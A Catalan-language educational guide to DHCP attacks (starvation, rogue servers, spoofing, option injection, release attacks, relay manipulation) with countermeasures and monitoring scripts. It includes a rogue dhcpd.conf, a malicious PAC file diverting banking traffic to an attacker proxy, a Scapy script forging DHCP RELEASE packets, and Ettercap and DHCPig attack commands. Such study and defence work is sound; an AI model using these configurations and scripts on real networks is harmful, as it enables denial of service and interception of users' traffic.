# Atacs contra Serveis DHCP - Anàlisi Detallada

## Índex
1. [DHCP Starvation (Esgotament DHCP)](#1-dhcp-starvation-esgotament-dhcp)
2. [Rogue DHCP Server (Servidor DHCP Maliciós)](#2-rogue-dhcp-server-servidor-dhcp-maliciós)
3. [DHCP Spoofing Avançat](#3-dhcp-spoofing-avançat)
4. [DHCP Option Injection](#4-dhcp-option-injection-injecció-dopcions-dhcp)
5. [DHCP Release/Renew Attacks](#5-dhcp-releaserenew-attacks-atacs-de-alliberamentrrenovació)
6. [DHCP Relay Attacks](#6-dhcp-relay-attacks-atacs-a-relay-dhcp)
7. [DHCP Fingerprinting](#7-dhcp-fingerprinting-i-intelligence-gathering)
8. [Contramedides](#contramedides-específiques-per-cada-atac)

---

## 1. DHCP Starvation (Esgotament DHCP)

### Funcionament Detallat

L'atacant genera múltiples paquets DHCP DISCOVER amb adreces MAC falsificades. Cada paquet simula ser un dispositiu diferent sol·licitant una IP. El servidor DHCP assigna una adreça IP a cada MAC falsa fins que s'esgota el pool d'adreces disponibles.

### Procés Tècnic

1. **Descobriment del rang DHCP:** L'atacant identifica l'abast d'IPs disponibles
2. **Generació de MACs falses:** Crea adreces MAC úniques algorítmicament
3. **Flood de DISCOVER:** Envia massivament paquets DHCP DISCOVER
4. **Manteniment dels leases:** Renova periòdicament per mantenir les IPs ocupades

### Variants Avançades

- **Targeted starvation:** Se centra en subredes específiques
- **Intelligent starvation:** Deixa algunes IPs lliures per evitar detecció
- **Coordinated attack:** Múltiples atacants des de diferents punts

### Impacte

- Denegació de servei per a nous dispositius
- Interrupció de la connectivitat de xarxa
- Clients legítims que no poden obtenir IP

### Detecció

- Pool d'adreces DHCP al 100% d'ocupació sobtadament
- Gran nombre de MACs noves en logs DHCP
- Queixes d'usuaris sobre impossibilitat de connectar-se

---

## 2. Rogue DHCP Server (Servidor DHCP Maliciós)

### Implementació Detallada

#### Fase de Preparació

1. **Reconeixement de xarxa:** Identificar la configuració DHCP actual
2. **Posicionament estratègic:** Situar-se físicament o lògicament a la xarxa
3. **Configuració del servidor maliciós:** Crear un perfil DHCP atractiu

#### Configuració del Servidor Maliciós

```bash
# Exemple de configuració maliciosa (dhcpd.conf)
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.100 192.168.1.200;
    option routers 192.168.1.10;          # Gateway fals (atacant)
    option domain-name-servers 8.8.8.8, 192.168.1.10;  # DNS mixt
    option domain-name "corporate.local";
    default-lease-time 7200;              # Lease curt per control
    max-lease-time 7200;
}
```

### Estratègies d'Atac

- **Speed advantage:** Respondre més ràpid que el servidor legítim
- **Attractive offers:** Oferir lease times més llargs
- **Selective targeting:** Atacar només dispositius específics

### Payloads Maliciosos Comuns

- **DNS Poisoning:** Servidor DNS controlat per l'atacant
- **Gateway redirection:** Tot el tràfic passa per l'atacant
- **Proxy injection:** Configuració automàtica de proxy maliciós
- **WPAD exploitation:** Web Proxy Auto-Discovery maliciós

---

## 3. DHCP Spoofing Avançat

### Tècniques Sofisticades

#### Man-in-the-Middle DHCP

1. **Interceptació:** Captura paquets DHCP DISCOVER legítims
2. **Anàlisi:** Extreu informació del client (hostname, vendor, etc.)
3. **Personalització:** Crea respostes específiques per cada client
4. **Injecció:** Envia DHCP OFFER personalitzat abans del servidor real

#### DHCP Race Condition

- Explota el timing entre DISCOVER i OFFER
- Utilitza múltiples interfícies per augmentar velocitat
- Implementa cache de respostes preparades

#### Session Hijacking via DHCP

```python
# Pseudocodi d'atac
def dhcp_hijack(target_mac, target_ip):
    # Enviar DHCP RELEASE fals per alliberar la IP
    send_dhcp_release(target_mac, target_ip)
    
    # Immediatament sol·licitar la mateixa IP
    send_dhcp_discover(attacker_mac)
    
    # Configurar IP amb gateway maliciós
    configure_malicious_dhcp_offer(target_ip)
```

---

## 4. DHCP Option Injection (Injecció d'Opcions DHCP)

### Opcions DHCP Crítiques per Atacar

#### Opció 121 - Static Routes (Rutes Estàtiques)

```bash
# Exemple d'injecció maliciosa
option classless-static-routes 
    8, 10.0.0.0, 192.168.1.10,     # Redirigir 10.0.0.0/8 a atacant
    24, 192.168.2.0, 192.168.1.10, # Redirigir subxarxa específica
    0, 192.168.1.1;                 # Gateway per defecte original
```

#### Opció 252 - Proxy Auto-Config

```bash
option web-proxy-auto-discovery-url "http://192.168.1.10/wpad.dat";
```

##### Contingut del Fitxer PAC Maliciós

```javascript
function FindProxyForURL(url, host) {
    // Interceptar tràfic bancari
    if (shExpMatch(host, "*.bank.com") || shExpMatch(host, "*banking*")) {
        return "PROXY 192.168.1.10:8080";
    }
    
    // Interceptar tràfic social media
    if (shExpMatch(host, "*.facebook.com") || shExpMatch(host, "*.twitter.com")) {
        return "PROXY 192.168.1.10:8080";
    }
    
    // Permetre altre tràfic directament
    return "DIRECT";
}
```

#### Altres Opcions Importants

- **Opció 15 - Domain Name:** Canviar domini per DNS spoofing
- **Opció 119 - Domain Search List:** Manipular l'ordre de cerca de dominis
- **Opció 6 - DNS Servers:** Redirigir tot el DNS
- **Opció 3 - Default Gateway:** Control total del routing

---

## 5. DHCP Release/Renew Attacks (Atacs de Alliberament/Renovació)

### DoS Intermitent

#### DHCP Release Attack

```python
# Tècnica d'atac
import scapy.all as scapy

def dhcp_release_attack(target_range, dhcp_server):
    for target_ip in target_range:
        # Obtenir MAC associada a la IP
        target_mac = get_mac_for_ip(target_ip)
        
        # Crear paquet DHCP RELEASE fals
        dhcp_release = scapy.DHCP(options=[
            ("message-type", "release"),
            ("server_id", dhcp_server),
            ("end")
        ])
        
        packet = (scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) /
                  scapy.IP(src=target_ip, dst=dhcp_server) /
                  scapy.UDP(sport=68, dport=67) /
                  scapy.BOOTP(chaddr=target_mac, ciaddr=target_ip) /
                  dhcp_release)
        
        scapy.sendp(packet)
```

#### DHCP Decline Attack

- Envia DHCP DECLINE per marcar IPs com "in use"
- Simula conflictes d'IP per crear confusió
- Força al servidor a marcar IPs com no disponibles

#### Renewal Hijacking

1. **Monitorització:** Detectar quan clients intenten renovar
2. **Interceptació:** Capturar paquets DHCP REQUEST
3. **Competició:** Enviar DHCP NAK abans del servidor legítim
4. **Substitució:** Oferir nova configuració quan el client torna a DISCOVER

---

## 6. DHCP Relay Attacks (Atacs a Relay DHCP)

### Man-in-the-Middle via Relay

#### Relay Agent Spoofing

- Simular ser un relay agent legítim
- Interceptar sol·licituds entre subredes
- Modificar Option 82 (Relay Agent Information)

#### Tècnica GIADDR Manipulation

```bash
# Modificar camp GIADDR en paquets relay
Original: GIADDR = 192.168.1.1 (subnet A)
Maliciós: GIADDR = 192.168.2.1 (subnet B controlada per atacant)
```

#### Option 82 Injection

```python
# Exemple d'injecció maliciosa
option_82 = {
    'circuit_id': b'\x01\x04\x00\x10\x00\x01',  # Port fals
    'remote_id': b'\x02\x06attacker_switch'      # Switch controlat
}
```

---

## 7. DHCP Fingerprinting i Intelligence Gathering

### Passive Information Gathering

#### Anàlisi d'Opcions DHCP Sol·licitades

- **Opció 55 (Parameter Request List):** Revela SO i aplicacions
- **Vendor Class Identifier:** Identifica tipus de dispositiu
- **Hostname option:** Revela informació d'usuari

#### Device Classification

```python
# Signatures comuns
signatures = {
    "MSFT 5.0": "Windows XP/Vista",
    "MSFT 98": "Windows 98",
    "android-dhcp": "Android Device", 
    "iPhone": "iOS Device",
    "DHCP Zyxel": "Router Zyxel",
    "udhcp": "Dispositiu Linux embedded",
    "DHCP VendorClass": "Equip de xarxa"
}

def identify_device(vendor_class, parameter_list):
    if vendor_class in signatures:
        device_type = signatures[vendor_class]
    else:
        device_type = analyze_parameters(parameter_list)
    
    return device_type
```

### Active Probing

- Enviar DHCP INFORM per obtenir configuració sense lease
- Utilitzar opcions específiques per triggering responses
- Timing analysis per fingerprinting de servidor

---

## Contramedides Específiques per Cada Atac

### Contra DHCP Starvation

#### Configuració Cisco Switch

```cisco
# Habilitar DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

# Limitar rate de paquets DHCP per port
interface range GigabitEthernet0/1-24
 ip dhcp snooping limit rate 10  # Màxim 10 paquets/segon
 
# Configurar ports trusted (uplinks)
interface GigabitEthernet0/48
 ip dhcp snooping trust
```

#### Configuració HP/Aruba Switch

```bash
dhcp-snooping
dhcp-snooping vlan 10,20,30
dhcp-snooping trust GigabitEthernet1/0/48
dhcp-snooping max-binding 1000
```

### Contra Rogue DHCP Server

#### DHCP Snooping Avançat

```cisco
# Configuració completa DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10-50

# Ports trusted només per a servidors DHCP legítims
interface GigabitEthernet0/1
 description "Conexio a servidor DHCP legítim"
 ip dhcp snooping trust
 
# Tots els altres ports com untrusted
interface range GigabitEthernet0/2-47
 ip dhcp snooping limit rate 5
 
# Habilitar detecció d'ofertes múltiples
ip dhcp snooping information option
ip dhcp snooping verify mac-address
```

#### Detecció d'Anomalies

```bash
#!/bin/bash
# Script de monitorització DHCP
LOG_FILE="/var/log/dhcp-monitor.log"

# Monitoritzar múltiples servidors DHCP
tcpdump -i any port 67 -l | while read line; do
    echo "$line" | grep "DHCP.*Offer" | awk '{
        server_ip = $x  # Extreure IP del servidor
        if (server_ip != "192.168.1.1") {
            print "[ALERT] Rogue DHCP detected from:", server_ip
        }
    }' >> $LOG_FILE
done
```

### Contra Option Injection

#### Filtrat d'Opcions Perilloses

```python
# Exemple de filtrat en proxy DHCP
DANGEROUS_OPTIONS = [121, 252, 15, 119, 249]

def filter_dhcp_options(dhcp_packet):
    filtered_options = []
    
    for option in dhcp_packet.options:
        option_code = option[0] if isinstance(option[0], int) else ord(option[0])
        
        if option_code not in DANGEROUS_OPTIONS:
            filtered_options.append(option)
        else:
            print(f"[WARNING] Blocked dangerous DHCP option {option_code}")
    
    dhcp_packet.options = filtered_options
    return dhcp_packet
```

### Contra Release/Renew Attacks

#### Dynamic ARP Inspection (DAI)

```cisco
# Habilitar DAI
ip arp inspection vlan 10-50

# Configurar trusted ports per DAI
interface GigabitEthernet0/48
 ip arp inspection trust
 
# Rate limiting per ARP
ip arp inspection limit rate 15

# Validacions addicionals
ip arp inspection validate src-mac dst-mac ip
```

#### IP Source Guard

```cisco
# Habilitar IP Source Guard
interface range GigabitEthernet0/1-47
 ip verify source port-security
 ip verify source dhcp-snooping
```

### Monitorització i Logging Avançat

#### Script de Monitorització Complet

```bash
#!/bin/bash
# Monitor DHCP comprehensiu

LOG_DIR="/var/log/dhcp-security"
mkdir -p $LOG_DIR

# Monitoritzar anomalies DHCP
tcpdump -i any -w $LOG_DIR/dhcp-$(date +%Y%m%d).pcap port 67 or port 68 &

# Anàlisi en temps real
tail -f /var/log/syslog | grep -i dhcp | while read line; do
    # Detectar múltiples ofertes
    if echo "$line" | grep -q "DHCPOFFER"; then
        server=$(echo "$line" | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+')
        echo "$(date): DHCP Offer from $server" >> $LOG_DIR/offers.log
    fi
    
    # Detectar starvation
    if echo "$line" | grep -q "no free leases"; then
        echo "$(date): [CRITICAL] DHCP Pool exhausted!" >> $LOG_DIR/alerts.log
        # Enviar alerta
        mail -s "DHCP Pool Exhausted" admin@company.com < $LOG_DIR/alerts.log
    fi
done
```

#### SNMP Monitoring per DHCP

```python
import pysnmp
from pysnmp.hlapi import *

def monitor_dhcp_pool():
    # OID per pool utilization (exemple Cisco)
    pool_oid = '1.3.6.1.4.1.9.9.101.1.2.1.1.6'
    
    for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
        SnmpEngine(),
        CommunityData('public'),
        UdpTransportTarget(('dhcp-server-ip', 161)),
        ContextData(),
        ObjectType(ObjectIdentity(pool_oid)),
        lexicographicMode=False):
        
        if errorIndication:
            print(errorIndication)
            break
        elif errorStatus:
            print(f"{errorStatus} at {errorIndex}")
            break
        else:
            for varBind in varBinds:
                pool_usage = int(varBind[1])
                if pool_usage > 90:  # 90% utilitzat
                    send_alert(f"DHCP Pool at {pool_usage}% capacity")
```

## Eines d'Atac Comunes

### Yersinia
- Framework per atacs de capa 2
- Interfície gràfica i de línia de comandes
- Suport per múltiples protocols incloent DHCP

### DHCPig
```bash
# Exemple d'ús DHCPig per starvation
./dhcpig.py -i eth0 -v
```

### Scapy (Python)
```python
# Exemple d'atac personalitzat
from scapy.all import *

def custom_dhcp_attack():
    # Crear paquet DHCP maliciós
    dhcp_discover = DHCP(options=[("message-type","discover"),"end"])
    # ... rest del codi
```

### Ettercap
```bash
# Atac man-in-the-middle amb DHCP spoofing
ettercap -T -M dhcp:192.168.1.0/24/192.168.1.1,192.168.1.254 -P dns_spoof
```

---

## Recomanacions de Seguretat

### Implementació per Capes

1. **Capa Física:** Control d'accés físic als switches
2. **Capa 2:** DHCP Snooping, Port Security, DAI
3. **Capa 3:** IP Source Guard, ACLs
4. **Capa d'Aplicació:** Monitorització i alertes

### Auditoria Regular

- Revisió periòdica de logs DHCP
- Verificació de configuracions de seguretat
- Tests de penetració interns
- Actualització de signatures de detecció

### Documentació i Formació

- Procediments d'incident response per atacs DHCP
- Formació del personal en detecció d'anomalies
- Mantenir inventari actualitzat de dispositius de xarxa

---

*Document generat per a fins educatius i de conscienciació en seguretat de xarxes.*